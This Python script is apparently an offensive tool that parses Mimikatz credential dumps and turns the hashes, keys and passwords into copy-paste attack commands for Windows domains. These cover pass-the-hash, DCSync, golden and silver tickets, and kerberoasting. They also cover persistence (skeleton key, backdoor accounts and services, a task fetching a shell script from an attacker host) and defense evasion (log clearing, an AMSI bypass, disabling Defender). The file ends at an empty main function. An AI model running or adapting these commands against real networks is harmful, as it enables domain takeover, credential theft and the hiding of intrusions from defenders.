#!/usr/bin/env python3
"""
Mimikatz Output Parser & Attack Generator - ENHANCED EDITION
Parses mimikatz output and generates ALL possible attack commands
Including: Lateral Movement, Persistence, Privilege Escalation, Data Exfiltration

Usage:
    python3 mimikatz_parser_enhanced.py mimikatz_output.txt -o attacks.txt -t 172.16.10.5 -d 172.16.10.5
"""

import re
import sys
import argparse
from dataclasses import dataclass, field
from typing import List, Set

@dataclass
class Credential:
    username: str = ""
    domain: str = ""
    ntlm: str = ""
    sha1: str = ""
    password: str = ""
    dpapi: str = ""
    aes128: str = ""
    aes256: str = ""
    sid: str = ""
    logon_server: str = ""
    is_machine_account: bool = False

@dataclass
class DCSyncData:
    username: str = ""
    domain: str = ""
    ntlm: str = ""
    sid: str = ""
    aes256: str = ""
    aes128: str = ""

@dataclass
class LSASecret:
    name: str = ""
    data: str = ""

@dataclass
class SAMEntry:
    username: str = ""
    rid: str = ""
    ntlm: str = ""

@dataclass
class TrustKey:
    domain: str = ""
    ntlm: str = ""

@dataclass
class DPAPIKey:
    guid: str = ""
    masterkey: str = ""

@dataclass
class ParsedData:
    credentials: List[Credential] = field(default_factory=list)
    dcsync_data: List[DCSyncData] = field(default_factory=list)
    lsa_secrets: List[LSASecret] = field(default_factory=list)
    sam_entries: List[SAMEntry] = field(default_factory=list)
    trust_keys: List[TrustKey] = field(default_factory=list)
    dpapi_keys: List[DPAPIKey] = field(default_factory=list)
    domains: Set[str] = field(default_factory=set)
    dc_names: Set[str] = field(default_factory=set)
    domain_sids: Set[str] = field(default_factory=set)


class MimikatzParser:
    def __init__(self, content: str):
        self.content = content
        self.data = ParsedData()
        
    def parse(self) -> ParsedData:
        self.parse_logonpasswords()
        self.parse_dcsync()
        self.parse_dcsync_csv()
        self.parse_sam()
        self.parse_lsa_secrets()
        self.parse_trust_keys()
        self.parse_dpapi()
        self.extract_domains()
        self.extract_sids()
        return self.data
    
    def parse_logonpasswords(self):
        auth_blocks = re.split(r'Authentication Id\s*:', self.content)
        for block in auth_blocks[1:]:
            cred = Credential()
            
            user_match = re.search(r'User Name\s*:\s*(\S+)', block)
            if user_match:
                cred.username = user_match.group(1)
            
            domain_match = re.search(r'Domain\s*:\s*(\S+)', block)
            if domain_match:
                cred.domain = domain_match.group(1)
            
            sid_match = re.search(r'SID\s*:\s*(S-[\d-]+)', block)
            if sid_match:
                cred.sid = sid_match.group(1)
            
            logon_srv = re.search(r'Logon Server\s*:\s*(\S+)', block)
            if logon_srv and logon_srv.group(1) != '(null)':
                cred.logon_server = logon_srv.group(1)
                self.data.dc_names.add(logon_srv.group(1))
            
            if cred.username and cred.username.endswith('$'):
                cred.is_machine_account = True
            
            msv_match = re.search(r'msv\s*:.*?(?=tspkg|wdigest|kerberos|ssp|credman|$)', block, re.DOTALL)
            if msv_match:
                msv_block = msv_match.group(0)
                ntlm = re.search(r'\*\s*NTLM\s*:\s*([a-fA-F0-9]{32})', msv_block)
                sha1 = re.search(r'\*\s*SHA1\s*:\s*([a-fA-F0-9]{40})', msv_block)
                if ntlm:
                    cred.ntlm = ntlm.group(1)
                if sha1:
                    cred.sha1 = sha1.group(1)
            
            kerb_match = re.search(r'kerberos\s*:.*?(?=ssp|credman|$)', block, re.DOTALL)
            if kerb_match:
                kerb_block = kerb_match.group(0)
                pwd = re.search(r'\*\s*Password\s*:\s*(.+?)(?:\r?\n|$)', kerb_block)
                if pwd and pwd.group(1).strip() not in ['(null)', '']:
                    cred.password = pwd.group(1).strip()
                aes256 = re.search(r'\*\s*aes256_hmac\s*:\s*([a-fA-F0-9]{64})', kerb_block)
                aes128 = re.search(r'\*\s*aes128_hmac\s*:\s*([a-fA-F0-9]{32})', kerb_block)
                if aes256:
                    cred.aes256 = aes256.group(1)
                if aes128:
                    cred.aes128 = aes128.group(1)
            
            wdigest_match = re.search(r'wdigest\s*:.*?(?=kerberos|ssp|credman|$)', block, re.DOTALL)
            if wdigest_match:
                wdigest_block = wdigest_match.group(0)
                pwd = re.search(r'\*\s*Password\s*:\s*(.+?)(?:\r?\n|$)', wdigest_block)
                if pwd and pwd.group(1).strip() not in ['(null)', ''] and not cred.password:
                    cred.password = pwd.group(1).strip()
            
            if cred.username and cred.username not in ['(null)', 'DWM-1', 'DWM-2', 'DWM-3', 'UMFD-0', 'UMFD-1', 'UMFD-2']:
                self.data.credentials.append(cred)
    
    def parse_dcsync(self):
        dcsync_blocks = re.findall(
            r'Object RDN\s*:\s*(\S+).*?'
            r'SAM Username\s*:\s*(\S+).*?'
            r'Object Security ID\s*:\s*(S-[\d-]+).*?'
            r'Hash NTLM\s*:\s*([a-fA-F0-9]{32})',
            self.content, re.DOTALL
        )
        for rdn, sam_user, sid, ntlm in dcsync_blocks:
            dc = DCSyncData()
            dc.username = sam_user
            dc.sid = sid
            dc.ntlm = ntlm
            aes256 = re.search(rf'{sam_user}.*?aes256_hmac\s*(?:\(\d+\))?\s*:\s*([a-fA-F0-9]{{64}})', self.content, re.DOTALL)
            aes128 = re.search(rf'{sam_user}.*?aes128_hmac\s*(?:\(\d+\))?\s*:\s*([a-fA-F0-9]{{32}})', self.content, re.DOTALL)
            if aes256:
                dc.aes256 = aes256.group(1)
            if aes128:
                dc.aes128 = aes128.group(1)
            self.data.dcsync_data.append(dc)
    
    def parse_dcsync_csv(self):
        csv_pattern = re.findall(r'(\d+)\s+(\S+)\s+([a-fA-F0-9]{32})\s+(\d+)', self.content)
        existing_users = {d.username for d in self.data.dcsync_data}
        for rid, username, ntlm, uac in csv_pattern:
            if username not in existing_users:
                dc = DCSyncData()
                dc.username = username
                dc.ntlm = ntlm
                self.data.dcsync_data.append(dc)
                existing_users.add(username)
    
    def parse_sam(self):
        sam_blocks = re.findall(
            r'RID\s*:\s*([a-fA-F0-9]+)\s*\(\d+\).*?User\s*:\s*(\S+).*?Hash NTLM\s*:\s*([a-fA-F0-9]{32})',
            self.content, re.DOTALL
        )
        for rid, user, ntlm in sam_blocks:
            entry = SAMEntry()
            entry.username = user
            entry.rid = rid
            entry.ntlm = ntlm
            self.data.sam_entries.append(entry)
    
    def parse_lsa_secrets(self):
        dpapi_match = re.search(r'DPAPI_SYSTEM.*?full:\s*([a-fA-F0-9]+)', self.content, re.DOTALL)
        if dpapi_match:
            secret = LSASecret()
            secret.name = "DPAPI_SYSTEM"
            secret.data = dpapi_match.group(1)
            self.data.lsa_secrets.append(secret)
        
        service_secrets = re.findall(r'_SC_(\S+).*?cur/text:\s*(.+?)(?:\r?\n|$)', self.content, re.DOTALL)
        for svc_name, svc_pass in service_secrets:
            if svc_pass.strip():
                secret = LSASecret()
                secret.name = f"_SC_{svc_name}"
                secret.data = svc_pass.strip()
                self.data.lsa_secrets.append(secret)
    
    def parse_trust_keys(self):
        trust_blocks = re.findall(
            r'\[\s*In\s*\].*?Domain\s*:\s*(\S+).*?(?:rc4_hmac_nt|NTLM)\s*:\s*([a-fA-F0-9]{32})',
            self.content, re.DOTALL | re.IGNORECASE
        )
        for domain, key in trust_blocks:
            trust = TrustKey()
            trust.domain = domain
            trust.ntlm = key
            self.data.trust_keys.append(trust)
    
    def parse_dpapi(self):
        mk_blocks = re.findall(r'GUID\s*:\s*\{([a-fA-F0-9-]+)\}.*?MasterKey\s*:\s*([a-fA-F0-9]+)', self.content, re.DOTALL)
        for guid, mk in mk_blocks:
            key = DPAPIKey()
            key.guid = guid
            key.masterkey = mk
            self.data.dpapi_keys.append(key)
    
    def extract_domains(self):
        domains = re.findall(r"'([^']+\.(?:local|LOCAL|com|COM))'\s+will be the domain", self.content)
        for d in domains:
            self.data.domains.add(d)
        domains2 = re.findall(r'Domain\s*:\s*(\S+)', self.content)
        for d in domains2:
            if d and d not in ['(null)', 'Window', 'Font', 'NT', 'Kerberos']:
                clean = d.upper().replace('.LOCAL', '').replace('.COM', '')
                if len(clean) > 1:
                    self.data.domains.add(clean)
    
    def extract_sids(self):
        sids = re.findall(r'(S-1-5-21-\d+-\d+-\d+)', self.content)
        for sid in sids:
            self.data.domain_sids.add(sid)


class AttackGenerator:
    def __init__(self, data: ParsedData, target: str = "<TARGET>", dc_ip: str = "<DC_IP>"):
        self.data = data
        self.output = []
        self.target = target
        self.dc_ip = dc_ip
        
    def generate_all(self) -> str:
        self.output = []
        unique_creds = self.deduplicate_credentials()
        
        self.generate_summary(unique_creds)
        self.generate_pth_attacks(unique_creds)
        self.generate_ptk_attacks(unique_creds)
        self.generate_lateral_movement_full(unique_creds)
        self.generate_dcsync_attacks(unique_creds)
        self.generate_golden_ticket_attacks(unique_creds)
        self.generate_silver_ticket_attacks(unique_creds)
        self.generate_kerberoasting(unique_creds)
        self.generate_persistence_full(unique_creds)
        self.generate_data_exfiltration(unique_creds)
        self.generate_defense_evasion()
        self.generate_quick_wins(unique_creds)
        self.generate_cracking_commands(unique_creds)
        
        return '\n'.join(self.output)
    
    def deduplicate_credentials(self) -> List[Credential]:
        seen = set()
        unique = []
        for cred in self.data.credentials:
            key = (cred.username, cred.domain, cred.ntlm, cred.password)
            if key not in seen and cred.username:
                seen.add(key)
                unique.append(cred)
        
        for dc in self.data.dcsync_data:
            key = (dc.username, "", dc.ntlm, "")
            if key not in seen:
                seen.add(key)
                cred = Credential()
                cred.username = dc.username
                cred.ntlm = dc.ntlm
                cred.aes256 = dc.aes256
                cred.aes128 = dc.aes128
                cred.sid = dc.sid
                cred.is_machine_account = dc.username.endswith('$')
                unique.append(cred)
        return unique
    
    def add_section(self, title: str):
        self.output.append(f"\n{'#'*80}")
        self.output.append(f"# {title}")
        self.output.append('#'*80)
    
    def add_subsection(self, title: str):
        self.output.append(f"\n# --- {title} ---")
    
    def add_cmd(self, desc: str, cmd: str):
        self.output.append(f"# {desc}")
        self.output.append(cmd)
        self.output.append("")
    
    def get_domain(self, cred: Credential) -> str:
        if cred.domain:
            return cred.domain
        if self.data.domains:
            return list(self.data.domains)[0]
        return "DOMAIN"
    
    def get_domain_fqdn(self, cred: Credential) -> str:
        domain = self.get_domain(cred)
        if '.' not in domain:
            return f"{domain}.local"
        return domain
    
    def get_sid(self) -> str:
        if self.data.domain_sids:
            return list(self.data.domain_sids)[0]
        return "<DOMAIN_SID>"
    
    def get_dc(self) -> str:
        if self.data.dc_names:
            return list(self.data.dc_names)[0]
        return self.dc_ip

    def generate_summary(self, creds: List[Credential]):
        self.add_section("EXTRACTED DATA SUMMARY")
        users_with_ntlm = [c for c in creds if c.ntlm and not c.is_machine_account]
        users_with_pwd = [c for c in creds if c.password and not c.is_machine_account]
        machine_accts = [c for c in creds if c.is_machine_account and c.ntlm]
        
        self.output.append(f"# User accounts with NTLM: {len(users_with_ntlm)}")
        self.output.append(f"# User accounts with cleartext: {len(users_with_pwd)}")
        self.output.append(f"# Machine accounts: {len(machine_accts)}")
        self.output.append(f"# Domains: {', '.join(self.data.domains) if self.data.domains else 'N/A'}")
        self.output.append(f"# Domain SIDs: {', '.join(self.data.domain_sids) if self.data.domain_sids else 'N/A'}")
        self.output.append(f"# DC names: {', '.join(self.data.dc_names) if self.data.dc_names else 'N/A'}")
        
        self.add_subsection("Extracted Credentials")
        for c in users_with_ntlm:
            line = f"# {c.domain}\\{c.username} | NTLM: {c.ntlm}"
            if c.password:
                line += f" | PWD: {c.password}"
            self.output.append(line)

    def generate_pth_attacks(self, creds: List[Credential]):
        ntlm_creds = [c for c in creds if c.ntlm and not c.is_machine_account]
        if not ntlm_creds:
            return
        
        self.add_section("PASS-THE-HASH ATTACKS")
        
        for c in ntlm_creds:
            domain = self.get_domain(c)
            user = c.username
            ntlm = c.ntlm
            
            self.add_subsection(f"{domain}\\{user}")
            
            # Impacket Suite
            self.add_cmd("PsExec (SYSTEM shell)", f"impacket-psexec '{domain}/{user}@{self.target}' -hashes ':{ntlm}'")
            self.add_cmd("WMIExec (stealthier)", f"impacket-wmiexec '{domain}/{user}@{self.target}' -hashes ':{ntlm}'")
            self.add_cmd("SMBExec", f"impacket-smbexec '{domain}/{user}@{self.target}' -hashes ':{ntlm}'")
            self.add_cmd("AtExec", f"impacket-atexec '{domain}/{user}@{self.target}' -hashes ':{ntlm}' 'whoami'")
            self.add_cmd("DCOMExec", f"impacket-dcomexec '{domain}/{user}@{self.target}' -hashes ':{ntlm}'")
            
            # CrackMapExec
            self.add_cmd("CME SMB", f"crackmapexec smb {self.target} -u '{user}' -H '{ntlm}' -d '{domain}'")
            self.add_cmd("CME Exec", f"crackmapexec smb {self.target} -u '{user}' -H '{ntlm}' -d '{domain}' -x 'whoami /all'")
            self.add_cmd("CME SAM", f"crackmapexec smb {self.target} -u '{user}' -H '{ntlm}' -d '{domain}' --sam")
            self.add_cmd("CME LSA", f"crackmapexec smb {self.target} -u '{user}' -H '{ntlm}' -d '{domain}' --lsa")
            self.add_cmd("CME NTDS", f"crackmapexec smb {self.target} -u '{user}' -H '{ntlm}' -d '{domain}' --ntds")
            
            # NetExec
            self.add_cmd("NXC SMB", f"nxc smb {self.target} -u '{user}' -H '{ntlm}' -d '{domain}'")
            
            # Evil-WinRM
            self.add_cmd("Evil-WinRM", f"evil-winrm -i {self.target} -u '{user}' -H '{ntlm}'")
            
            # RDP
            self.add_cmd("xfreerdp PTH", f"xfreerdp /v:{self.target} /u:'{user}' /d:'{domain}' /pth:{ntlm}")
            
            # Mimikatz
            self.add_cmd("Mimikatz PTH", f".\\mimikatz.exe \"sekurlsa::pth /user:{user} /domain:{domain} /ntlm:{ntlm} /run:powershell.exe\" exit")
            
            # Rubeus
            self.add_cmd("Rubeus asktgt", f".\\Rubeus.exe asktgt /user:{user} /domain:{domain} /rc4:{ntlm} /ptt")

    def generate_ptk_attacks(self, creds: List[Credential]):
        aes_creds = [c for c in creds if c.aes256 or c.aes128]
        if not aes_creds:
            return
        
        self.add_section("PASS-THE-KEY (AES - STEALTHIER)")
        
        for c in aes_creds:
            domain = self.get_domain(c)
            domain_fqdn = self.get_domain_fqdn(c)
            user = c.username
            
            self.add_subsection(f"{domain}\\{user}")
            
            if c.aes256:
                self.add_cmd("Rubeus AES256", f".\\Rubeus.exe asktgt /user:{user} /domain:{domain_fqdn} /aes256:{c.aes256} /ptt")
                self.add_cmd("Impacket AES256", f"impacket-getTGT '{domain}/{user}' -aesKey '{c.aes256}'")
                self.add_cmd("Mimikatz AES256", f".\\mimikatz.exe \"sekurlsa::pth /user:{user} /domain:{domain} /aes256:{c.aes256} /run:cmd.exe\" exit")

    def generate_lateral_movement_full(self, creds: List[Credential]):
        valid_creds = [c for c in creds if c.ntlm and not c.is_machine_account]
        if not valid_creds:
            return
        
        self.add_section("LATERAL MOVEMENT - ALL METHODS")
        
        c = valid_creds[0]
        domain = self.get_domain(c)
        user = c.username
        ntlm = c.ntlm
        dc = self.get_dc()
        
        self.add_subsection("1. PSEXEC VARIANTS (Fastest)")
        self.add_cmd("Impacket PsExec", f"impacket-psexec '{domain}/{user}@{self.target}' -hashes ':{ntlm}'")
        self.add_cmd("Windows PsExec (after PTH)", f".\\PsExec64.exe \\\\{self.target} -accepteula cmd")
        
        self.add_subsection("2. WMIEXEC (Stealthier)")
        self.add_cmd("Impacket WMIExec", f"impacket-wmiexec '{domain}/{user}@{self.target}' -hashes ':{ntlm}'")
        self.add_cmd("WMI native (after PTH)", f"wmic /node:{self.target} process call create \"cmd.exe /c whoami > C:\\result.txt\"")
        
        self.add_subsection("3. SMBEXEC (via services)")
        self.add_cmd("Impacket SMBExec", f"impacket-smbexec '{domain}/{user}@{self.target}' -hashes ':{ntlm}'")
        
        self.add_subsection("4. ATEXEC (Scheduled Tasks)")
        self.add_cmd("Impacket AtExec", f"impacket-atexec '{domain}/{user}@{self.target}' -hashes ':{ntlm}' 'whoami'")
        self.add_cmd("Native schtasks (after PTH)", f"schtasks /create /s {self.target} /tn \"Update\" /tr \"cmd /c whoami > C:\\task.txt\" /sc once /st 00:00 /ru SYSTEM /f")
        self.add_cmd("Run task", f"schtasks /run /s {self.target} /tn \"Update\"")
        self.add_cmd("Delete task", f"schtasks /delete /s {self.target} /tn \"Update\" /f")
        
        self.add_subsection("5. DCOMEXEC (DCOM objects)")
        self.add_cmd("DCOMExec MMC20", f"impacket-dcomexec -object MMC20 '{domain}/{user}@{self.target}' -hashes ':{ntlm}'")
        self.add_cmd("DCOMExec ShellWindows", f"impacket-dcomexec -object ShellWindows '{domain}/{user}@{self.target}' -hashes ':{ntlm}'")
        
        self.add_subsection("6. WINRM / PSREMOTING")
        self.add_cmd("Evil-WinRM", f"evil-winrm -i {self.target} -u '{user}' -H '{ntlm}'")
        self.add_cmd("PowerShell Enter-PSSession (after PTH)", f"Enter-PSSession -ComputerName {self.target}")
        self.add_cmd("PowerShell Invoke-Command (after PTH)", f"Invoke-Command -ComputerName {self.target} -ScriptBlock {{whoami;hostname}}")
        
        self.add_subsection("7. SC SERVICE CREATION (after PTH)")
        self.add_cmd("Create service", f"sc \\\\{self.target} create backdoor binpath= \"cmd.exe /c whoami > C:\\svc.txt\"")
        self.add_cmd("Start service", f"sc \\\\{self.target} start backdoor")
        self.add_cmd("Read output", f"type \\\\{self.target}\\C$\\svc.txt")
        self.add_cmd("Delete service", f"sc \\\\{self.target} delete backdoor")
        
        self.add_subsection("8. SMB FILE ACCESS (after PTH)")
        self.add_cmd("List C$ share", f"dir \\\\{self.target}\\C$")
        self.add_cmd("Copy file", f"copy payload.exe \\\\{self.target}\\C$\\Windows\\Temp\\payload.exe")
        self.add_cmd("Execute via WMI", f"wmic /node:{self.target} process call create \"C:\\Windows\\Temp\\payload.exe\"")
        
        self.add_subsection("9. RDP (if Restricted Admin)")
        self.add_cmd("Enable Restricted Admin", f"crackmapexec smb {self.target} -u '{user}' -H '{ntlm}' -d '{domain}' -x 'reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f'")
        self.add_cmd("xfreerdp PTH", f"xfreerdp /v:{self.target} /u:'{user}' /d:'{domain}' /pth:{ntlm}")

    def generate_dcsync_attacks(self, creds: List[Credential]):
        priv_creds = [c for c in creds if c.ntlm and not c.is_machine_account]
        if not priv_creds:
            return
        
        self.add_section("DCSYNC ATTACKS")
        
        for c in priv_creds[:3]:
            domain = self.get_domain(c)
            domain_fqdn = self.get_domain_fqdn(c)
            user = c.username
            dc = self.get_dc()
            
            self.add_subsection(f"{domain}\\{user}")
            
            self.add_cmd("DCSync ALL", f"impacket-secretsdump '{domain}/{user}@{dc}' -hashes ':{c.ntlm}' -just-dc")
            self.add_cmd("DCSync NTLM only", f"impacket-secretsdump '{domain}/{user}@{dc}' -hashes ':{c.ntlm}' -just-dc-ntlm")
            self.add_cmd("DCSync krbtgt", f"impacket-secretsdump '{domain}/{user}@{dc}' -hashes ':{c.ntlm}' -just-dc-user krbtgt")
            self.add_cmd("DCSync Administrator", f"impacket-secretsdump '{domain}/{user}@{dc}' -hashes ':{c.ntlm}' -just-dc-user Administrator")
            self.add_cmd("Full dump", f"impacket-secretsdump '{domain}/{user}@{dc}' -hashes ':{c.ntlm}'")
            self.add_cmd("Mimikatz DCSync all", f".\\mimikatz.exe \"lsadump::dcsync /domain:{domain_fqdn} /all /csv\" exit")
            self.add_cmd("Mimikatz DCSync krbtgt", f".\\mimikatz.exe \"lsadump::dcsync /domain:{domain_fqdn} /user:krbtgt\" exit")

    def generate_golden_ticket_attacks(self, creds: List[Credential]):
        self.add_section("GOLDEN TICKET ATTACKS")
        
        krbtgt_cred = None
        for c in creds:
            if c.username.lower() == 'krbtgt':
                krbtgt_cred = c
                break
        for dc in self.data.dcsync_data:
            if dc.username.lower() == 'krbtgt':
                krbtgt_cred = Credential()
                krbtgt_cred.username = dc.username
                krbtgt_cred.ntlm = dc.ntlm
                krbtgt_cred.aes256 = dc.aes256
                break
        
        domain_fqdn = list(self.data.domains)[0] + ".local" if self.data.domains else "DOMAIN.local"
        sid = self.get_sid()
        
        if krbtgt_cred:
            self.add_subsection(f"KRBTGT FOUND: {krbtgt_cred.ntlm}")
            self.add_cmd("Golden Ticket RC4", f".\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:{domain_fqdn} /sid:{sid} /krbtgt:{krbtgt_cred.ntlm} /ptt\" exit")
            if krbtgt_cred.aes256:
                self.add_cmd("Golden Ticket AES256", f".\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:{domain_fqdn} /sid:{sid} /aes256:{krbtgt_cred.aes256} /ptt\" exit")
            self.add_cmd("Impacket Golden", f"impacket-ticketer -nthash '{krbtgt_cred.ntlm}' -domain-sid '{sid}' -domain '{domain_fqdn}' 'Administrator'")
            self.add_cmd("Use ticket", f"export KRB5CCNAME=Administrator.ccache && impacket-psexec '{domain_fqdn}/Administrator@{self.get_dc()}' -k -no-pass")
        else:
            self.output.append("# KRBTGT not found - DCSync it first")

    def generate_silver_ticket_attacks(self, creds: List[Credential]):
        machine_creds = [c for c in creds if c.is_machine_account and c.ntlm]
        if not machine_creds:
            return
        
        self.add_section("SILVER TICKET ATTACKS")
        
        for c in machine_creds:
            domain = self.get_domain(c)
            domain_fqdn = self.get_domain_fqdn(c)
            machine = c.username.rstrip('$')
            ntlm = c.ntlm
            sid = self.get_sid()
            
            self.add_subsection(f"Machine: {machine}")
            
            for svc in ['cifs', 'http', 'host', 'ldap', 'wsman']:
                self.add_cmd(f"Silver {svc.upper()}", f".\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:{domain_fqdn} /sid:{sid} /target:{machine}.{domain_fqdn} /service:{svc} /rc4:{ntlm} /ptt\" exit")

    def generate_kerberoasting(self, creds: List[Credential]):
        self.add_section("KERBEROASTING")
        
        creds_with_auth = [c for c in creds if c.ntlm or c.password]
        if creds_with_auth:
            c = creds_with_auth[0]
            domain = self.get_domain(c)
            dc = self.get_dc()
            
            if c.ntlm:
                self.add_cmd("GetUserSPNs", f"impacket-GetUserSPNs '{domain}/{c.username}' -hashes ':{c.ntlm}' -dc-ip {dc} -request -outputfile kerberoast.txt")
                self.add_cmd("CME Kerberoast", f"crackmapexec ldap {dc} -u '{c.username}' -H '{c.ntlm}' -d '{domain}' --kerberoasting kerberoast.txt")
        
        self.add_cmd("Rubeus Kerberoast", ".\\Rubeus.exe kerberoast /outfile:kerberoast.txt")
        self.add_cmd("Hashcat", "hashcat -m 13100 kerberoast.txt wordlist.txt -r rules/best64.rule")

    def generate_persistence_full(self, creds: List[Credential]):
        valid_creds = [c for c in creds if c.ntlm and not c.is_machine_account]
        if not valid_creds:
            return
        
        self.add_section("PERSISTENCE TECHNIQUES")
        
        c = valid_creds[0]
        domain = self.get_domain(c)
        domain_fqdn = self.get_domain_fqdn(c)
        sid = self.get_sid()
        
        self.add_subsection("1. GOLDEN TICKET")
        self.add_cmd("Create Golden Ticket", f".\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:{domain_fqdn} /sid:{sid} /krbtgt:<KRBTGT_HASH> /ptt\" exit")
        
        self.add_subsection("2. SKELETON KEY")
        self.add_cmd("Inject (password: mimikatz)", ".\\mimikatz.exe \"privilege::debug\" \"misc::skeleton\" exit")
        
        self.add_subsection("3. DSRM BACKDOOR")
        self.add_cmd("Enable DSRM login", "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f")
        
        self.add_subsection("4. ADMINSDHOLDER")
        self.add_cmd("Add rights", f"Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC={domain},DC=local' -PrincipalIdentity '{c.username}' -Rights All")
        
        self.add_subsection("5. DCSYNC RIGHTS")
        self.add_cmd("Grant DCSync", f"Add-DomainObjectAcl -TargetIdentity 'DC={domain},DC=local' -PrincipalIdentity '{c.username}' -Rights DCSync")
        
        self.add_subsection("6. NEW DOMAIN ADMIN")
        self.add_cmd("Create DA", "net user svc_backup Password123! /add /domain && net group \"Domain Admins\" svc_backup /add /domain")
        
        self.add_subsection("7. SCHEDULED TASK")
        self.add_cmd("Create task", f"schtasks /create /s {self.target} /tn \"SystemUpdate\" /tr \"powershell -c 'IEX(IWR http://ATTACKER/shell.ps1)'\" /sc daily /st 09:00 /ru SYSTEM")
        
        self.add_subsection("8. SERVICE")
        self.add_cmd("Create service", f"sc \\\\{self.target} create backdoor binpath= \"cmd.exe /c net user backdoor P@ss /add\" start= auto")
        
        self.add_subsection("9. REGISTRY RUN")
        self.add_cmd("Add autorun", "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Update /t REG_SZ /d \"C:\\Windows\\Temp\\payload.exe\" /f")
        
        self.add_subsection("10. SSP (Credential Capture)")
        self.add_cmd("Add mimilib SSP", "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v \"Security Packages\" /t REG_MULTI_SZ /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0mimilib\" /f")

    def generate_data_exfiltration(self, creds: List[Credential]):
        valid_creds = [c for c in creds if c.ntlm and not c.is_machine_account]
        if not valid_creds:
            return
        
        self.add_section("DATA EXFILTRATION")
        
        c = valid_creds[0]
        domain = self.get_domain(c)
        dc = self.get_dc()
        
        self.add_subsection("GPP Passwords")
        self.add_cmd("CME GPP", f"crackmapexec smb {dc} -u '{c.username}' -H '{c.ntlm}' -d '{domain}' -M gpp_password")
        
        self.add_subsection("LAPS Passwords")
        self.add_cmd("Get LAPS", "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select Name, ms-Mcs-AdmPwd")
        self.add_cmd("CME LAPS", f"crackmapexec smb {dc} -u '{c.username}' -H '{c.ntlm}' -d '{domain}' -M laps")
        
        self.add_subsection("Shares Spider")
        self.add_cmd("Spider shares", f"crackmapexec smb {self.target} -u '{c.username}' -H '{c.ntlm}' -d '{domain}' -M spider_plus")
        
        self.add_subsection("BloodHound")
        self.add_cmd("SharpHound", ".\\SharpHound.exe -c All")
        self.add_cmd("bloodhound-python", f"bloodhound-python -u '{c.username}' --hashes ':{c.ntlm}' -d '{domain}.local' -dc {dc} -c all")
        
        self.add_subsection("Certificates")
        self.add_cmd("Certipy find", f"certipy find -u '{c.username}' -hashes ':{c.ntlm}' -dc-ip {dc} -vulnerable")

    def generate_defense_evasion(self):
        self.add_section("DEFENSE EVASION")
        
        self.add_subsection("Clear Logs")
        self.add_cmd("Clear Security", "wevtutil cl Security")
        self.add_cmd("Clear all", "Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }")
        
        self.add_subsection("Disable Logging")
        self.add_cmd("Disable audit", "auditpol /set /category:* /success:disable /failure:disable")
        self.add_cmd("Disable PS logging", "reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f")
        
        self.add_subsection("AMSI Bypass")
        self.add_cmd("AMSI bypass", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)")
        
        self.add_subsection("Disable Defender")
        self.add_cmd("Disable realtime", "Set-MpPreference -DisableRealtimeMonitoring $true")
        self.add_cmd("Add exclusion", "Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp'")

    def generate_quick_wins(self, creds: List[Credential]):
        valid_creds = [c for c in creds if c.ntlm and not c.is_machine_account]
        if not valid_creds:
            return
        
        self.add_section("QUICK WINS - COPY/PASTE READY")
        
        c = valid_creds[0]
        domain = self.get_domain(c)
        dc = self.get_dc()
        
        da_cred = None
        for cred in valid_creds:
            if cred.username.lower() == 'administrator':
                da_cred = cred
                break
        
        if da_cred:
            self.add_subsection(f"*** DOMAIN ADMIN: {da_cred.username} ***")
            self.add_cmd("1. Shell on DC", f"impacket-psexec '{domain}/{da_cred.username}@{dc}' -hashes ':{da_cred.ntlm}'")
            self.add_cmd("2. DCSync all", f"impacket-secretsdump '{domain}/{da_cred.username}@{dc}' -hashes ':{da_cred.ntlm}' -just-dc -outputfile domain_dump")
            self.add_cmd("3. Get krbtgt", f"impacket-secretsdump '{domain}/{da_cred.username}@{dc}' -hashes ':{da_cred.ntlm}' -just-dc-user krbtgt")
            self.add_cmd("4. Evil-WinRM", f"evil-winrm -i {dc} -u '{da_cred.username}' -H '{da_cred.ntlm}'")
            self.add_cmd("5. Spray subnet", f"crackmapexec smb {self.target}/24 -u '{da_cred.username}' -H '{da_cred.ntlm}' -d '{domain}'")
            self.add_cmd("6. Dump SAM everywhere", f"crackmapexec smb {self.target}/24 -u '{da_cred.username}' -H '{da_cred.ntlm}' -d '{domain}' --sam")
        
        self.add_subsection("Mimikatz One-Liners (Windows)")
        if da_cred:
            self.add_cmd("PTH shell", f".\\mimikatz.exe \"sekurlsa::pth /user:{da_cred.username} /domain:{domain} /ntlm:{da_cred.ntlm} /run:powershell.exe\" exit")
            self.add_cmd("DCSync all", f".\\mimikatz.exe \"lsadump::dcsync /domain:{domain}.local /all /csv\" exit")

    def generate_cracking_commands(self, creds: List[Credential]):
        ntlms = list(set([c.ntlm for c in creds if c.ntlm]))
        if not ntlms:
            return
        
        self.add_section("HASH CRACKING")
        
        self.output.append("# Hashes for cracking:")
        for c in creds:
            if c.ntlm:
                self.output.append(f"# {c.username}:{c.ntlm}")
        
        self.add_cmd("NTLM (1000)", "hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule")
        self.add_cmd("NTLM brute", "hashcat -m 1000 hashes.txt -a 3 ?a?a?a?a?a?a?a?a")
        self.add_cmd("NetNTLMv2 (5600)", "hashcat -m 5600 ntlmv2.txt wordlist.txt")
        self.add_cmd("Kerberos TGS (13100)", "hashcat -m 13100 kerberoast.txt wordlist.txt")
        self.add_cmd("Kerberos AS-REP (18200)", "hashcat -m 18200 asrep.txt wordlist.txt")


def main():
